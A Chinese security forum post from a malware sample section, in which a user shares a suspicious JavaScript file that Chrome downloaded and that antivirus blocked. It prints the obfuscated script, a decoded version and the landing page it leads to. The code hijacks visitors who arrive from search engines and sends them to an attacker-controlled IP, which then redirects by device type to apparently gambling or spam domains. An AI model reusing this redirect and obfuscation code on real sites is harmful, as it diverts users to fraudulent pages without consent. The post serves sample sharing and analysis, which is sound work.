# 一个从chrome自动下载的js文件

> **作者**: likang | **发布时间**: 2019-07-03 00:20:00 | **版块**: 『病毒样本区』 | **查看/回复**: 333 / 9
> **原文**: [https://www.52pojie.cn/thread-984308-1-1.html](https://www.52pojie.cn/thread-984308-1-1.html)

---

*本帖最后由 likang 于 2019-7-3 00:45 编辑*

刚才看腾讯视频，突然卡巴弹出一个由chrome进程下载js文件拦截的窗口，我想腾讯视频不可能会自动下载js吧！我的浏览器配置ublock,1password分别都是谷歌商店下载的，chrome版本号75.0.3770.100

[JavaScript] *纯文本查看*

```
hxxp://222.186.129.41/a/105.js
```

我不知道链接什么时候失效，我把源码贴上来了！

[Asm] *纯文本查看*

```
var __encode ='sojson.com', _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(window);var __Ox43240=["\x72\x65\x66\x65\x72\x72\x65\x72","\x74\x65\x73\x74","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x32\x32\x32\x2E\x31\x38\x36\x2E\x31\x32\x39\x2E\x34\x31\x2F\x61\x2F\x31\x2E\x68\x74\x6D\x6C"];var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso)(\.[a-z0-9\-]+){1,2}\//ig;var where=document[__Ox43240[0x0]];if(regexp[__Ox43240[0x1]](where)){window[__Ox43240[0x3]][__Ox43240[0x2]]= __Ox43240[0x4]}
```

idm属于手动触发的

![](https://attach.52pojie.cn/forum/201907/03/001850ez1wmr5p1r1r8psr.png)

![](https://attach.52pojie.cn/forum/201907/03/002253xdrnlnadpxznprag.png)

一个新发现解密后

[JavaScript] *纯文本查看*

```
var __encode = 'sojson.com',
    _0xb483 = ["_decode", "http://www.sojson.com/javascriptobfuscator.html"];
(function(_0xd642x1) {
    _0xd642x1[_0xb483[0]] = _0xb483[1]
})(window);
var __Ox43240 = ["referrer", "test", "href", "location", "http://222.186.129.41/a/1.html"];
var regexp = /\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso)(\.[a-z0-9\-]+){1,2}\//ig;
var where = document[__Ox43240[0x0]];
if (regexp[__Ox43240[0x1]](where)) {
    window[__Ox43240[0x3]][__Ox43240[0x2]] = __Ox43240[0x4]
}
```

这是222.186.129.41/a/1.html

[XHTML] *纯文本查看*

```
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="icon" href="#">
	<style>
		html, body {
			height: auto;
			width: 100%;
			margin: 0 auto;
		}

		iframe {
			height: 100%;
			width: 100%;
			position: absolute;
			border: none;
		}
	</style>

</head>
<script type="text/javascript" src="https://js.users.51.la/19741139.js"></script>
<body>
<script>var bForcepc = fGetQuery("dv") == "pc";
function fBrowserRedirect(){
    var sUserAgent = navigator.userAgent.toLowerCase();

    var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
    var bIsIphone = sUserAgent.match(/iphone/i) == "iphone";
    var bIsIos = sUserAgent.match(/ios/i) == "ios";
    var bIsmacos = sUserAgent.match(/mac os/i) == "mac os";

    var bIsAndroid = sUserAgent.match(/android/i) == "android";
    var bIsaz = sUserAgent.match(/Android/i) == "Android";
    var bIslinux = sUserAgent.match(/linux/i) == "linux";
    var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";

    if(bIsIpad||bIsIphone||bIsIos||bIsmacos){ //判断苹果访问
        var sUrl = location.href;
		var d=document.referrer;
        if(!bForcepc){
         if(d.indexOf("baidu")>0||d.indexOf("google")>0||d.indexOf("sogou")>0||d.indexOf("bing")>0||d.indexOf("live")>0||d.indexOf("soso")>0||d.indexOf("youdao")>0||d.indexOf("zhongsou")>0||d.indexOf("yahoo")>0||d.indexOf("114")>0||d.indexOf("360.cn")>0||d.indexOf("bing")>0||d.indexOf("search")>0){window.location. //优化跳转

        }else{
            window.location.href = "https://liandie.hd78695.com/?c=s002"  //苹果端跳转地址
              }
        }
    }else if(bIsAndroid||bIsaz||bIslinux||bIsWM){ //判断安卓访问
        var sUrl = location.href;
		var d=document.referrer;
        if(!bForcepc){
         if(d.indexOf("baidu")>0||d.indexOf("google")>0||d.indexOf("sogou")>0||d.indexOf("bing")>0||d.indexOf("live")>0||d.indexOf("soso")>0||d.indexOf("youdao")>0||d.indexOf("zhongsou")>0||d.indexOf("yahoo")>0||d.indexOf("114")>0||d.indexOf("360.cn")>0||d.indexOf("bing")>0||d.indexOf("search")>0){window.location. //优化跳转

        }else{
            window.location.href = "https://liandie.hd78695.com/?c=s002"  //安卓端跳转地址
              }
        }
    }else{ //判断电脑访问

	  if(!bForcepc){
		var d=document.referrer;
        if(d.indexOf("baidu")>0||d.indexOf("google")>0||d.indexOf("sogou")>0||d.indexOf("bing")>0||d.indexOf("live")>0||d.indexOf("soso")>0||d.indexOf("youdao")>0||d.indexOf("zhongsou")>0||d.indexOf("yahoo")>0||d.indexOf("114")>0||d.indexOf("360.cn")>0||d.indexOf("bing")>0||d.indexOf("search")>0){window.location.//优化跳转

        }else{
            window.location.href = "http://hxctv17.com/?AgentID=15784" //电脑访问跳转地址
              }
        }
	}
}
function fGetQuery(name){//获取参数值
    var sUrl = window.location.search.substr(1);
    var r = sUrl.match(new RegExp("(^|&)" + name + "=([^&]*)(&|$)"));
    return (r == null ? null : unescape(r[2]));
}

fBrowserRedirect();</script>
</body>
</html>
```
